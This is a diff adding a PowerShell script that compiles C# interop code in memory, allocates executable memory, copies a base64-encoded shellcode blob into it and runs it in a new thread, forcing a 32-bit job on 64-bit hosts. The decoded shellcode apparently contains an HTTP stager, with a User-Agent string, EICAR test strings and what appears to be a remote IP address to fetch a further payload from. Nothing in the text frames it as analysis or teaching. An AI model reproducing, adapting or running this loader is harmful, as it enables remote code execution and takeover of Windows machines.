@@ -1,0 +1,48 @@
+Set-StrictMode -Version 2
+
+$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
+
+$DoIt = @'
+$assembly = @"
+	using System;
+	using System.Runtime.InteropServices;
+	namespace inject {
+		public class func {
+			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
+			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
+			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
+			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
+		}
+	}
+"@
+
+$compiler = New-Object Microsoft.CSharp.CSharpCodeProvider
+$params = New-Object System.CodeDom.Compiler.CompilerParameters
+$params.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
+$params.GenerateInMemory = $True
+$result = $compiler.CompileAssemblyFromSource($params, $assembly)
+
+[Byte[]]$var_code = [System.Convert]::FromBase64String("/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//V6AAAAAAx/1dXV1dXaDpWeaf/1emkAAAAWzHJUVFqA1FRaLsBAABTUGhXiZ/G/9VQ6YwAAABbMdJSaAAyoIRSUlJTUlBo61UuO//VicaDw1BogDMAAIngagRQah9WaHVGnob/1V8x/1dXav9TVmgtBhh7/9WFwA+EygEAADH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3UHWFDpe////zH/6ZEBAADpyQEAAOhv////L2lsN1AANU8hUCVAQVBbNFxQWlg1NChQXik3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKgA1TyFQJQBVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSAxMC4wOyBXaW5kb3dzIE5UIDYuMjsgV09XNjQ7IFRyaWRlbnQvNi4wOyBNQUFSSlMpDQoANU8hUCVAQVBbNFxQWlg1NChQXik3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKgA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCoANU8hUCUAaPC1olb/1WpAaAAQAABoAABAAFdoWKRT5f/Vk7kAAAAAAdlRU4nnV2gAIAAAU1ZoEpaJ4v/VhcB0xosHAcOFwHXlWMPoif3//zQ3LjUyLjYxLjI1MAAAAAAA")
+
+$buffer = [inject.func]::VirtualAlloc(0, $var_code.Length + 1, [inject.func+AllocationType]::Reserve -bOr [inject.func+AllocationType]::Commit, [inject.func+MemoryProtection]::ExecuteReadWrite)
+if ([Bool]!$buffer) { 
+	$global:result = 3; 
+	return 
+}
+[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $buffer, $var_code.Length)
+[IntPtr] $thread = [inject.func]::CreateThread(0, 0, $buffer, 0, 0, 0)
+if ([Bool]!$thread) {
+	$global:result = 7; 
+	return 
+}
+$result2 = [inject.func]::WaitForSingleObject($thread, [inject.func+Time]::Infinite)
+'@
+
+If ([IntPtr]::size -eq 8) {
+	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
+}
+else {
+	IEX $DoIt
+}
